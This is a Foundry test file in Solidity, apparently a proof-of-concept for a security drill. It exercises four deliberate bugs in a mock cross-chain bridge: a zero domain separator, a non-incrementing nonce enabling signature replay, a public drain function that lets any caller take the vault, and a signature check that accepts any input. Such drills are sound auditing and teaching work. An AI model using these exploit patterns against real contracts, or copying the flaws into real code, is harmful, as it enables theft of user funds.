// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/drill20_crosschain.sol";

contract Drill20PoC is Test {
    OmniBridge bridge;
    MockERC20 token;

    address relayer = vm.addr(1);
    address alice = address(0xAA);
    address mallory = address(0xBAD);

    function setUp() public {
        token = new MockERC20();
        token.mint(relayer, 20_000e18);
        token.mint(alice, 1000e18);
        vm.prank(vm.addr(1)); bridge = new OmniBridge(address(token));
        vm.prank(relayer);
        token.transfer(address(bridge), 10_000e18);
    }

    function test_BugA_DomainSeparatorZero() public {
        // DOMAIN_SEPARATOR should never be 0x0 if assigned correctly
        assertEq(bridge.DOMAIN_SEPARATOR(), bytes32(0), "DOMAIN_SEPARATOR is bytes32(0) - bug!");
    }

    function test_BugB_NonceNeverIncrements() public {
        // Alice deposits allowance
        vm.startPrank(alice);
        token.approve(address(bridge), type(uint256).max);

        // Alice's nonce starts at 0
        assertEq(bridge.nonces(alice), 0);

        // Build struct hash manually (because buildDigest had typo)
        bytes32 structHash = keccak256(
            abi.encode(
                keccak256("Withdraw(address user,uint256 amount,uint256 nonce,uint256 deadline)"),
                alice,
                uint256(100e18),
                uint256(0),
                uint256(block.timestamp + 1 hours)
            )
        );

        // Build the actual digest that the contract uses
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", bytes32(0), structHash));

        // Sign digest as relayer
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, digest); // sign with privKey 1 → vm.addr(1) = relayer
        vm.stopPrank();
        vm.startPrank(alice);

        // First withdrawal succeeds
        bridge.withdraw(100e18, block.timestamp + 1 hours, v, r, s);
        assertEq(bridge.nonces(alice), 0, "Nonce NOT incremented - bug!");

        vm.stopPrank();
    }

    function test_BugC_DrainAnyone() public {
        uint256 balBefore = token.balanceOf(mallory);

        // Anyone can drain the vault
        vm.prank(mallory);
        bridge.drain(mallory);

        uint256 balAfter = token.balanceOf(mallory);
        assertEq(balAfter - balBefore, 10_000e18, "Mallory stole all tokens!");
    }

    function test_BugD_AlwaysValidSig() public {
        bytes32 dummyHash = keccak256("anything");
        bytes memory fakeSig = new bytes(65);

        // Even with garbage signature, returns valid
        bytes4 result = bridge.isValidSignature(dummyHash, fakeSig);
        assertEq(result, bytes4(0x1626ba7e), "Returns magic value for ANY sig!");
    }
}
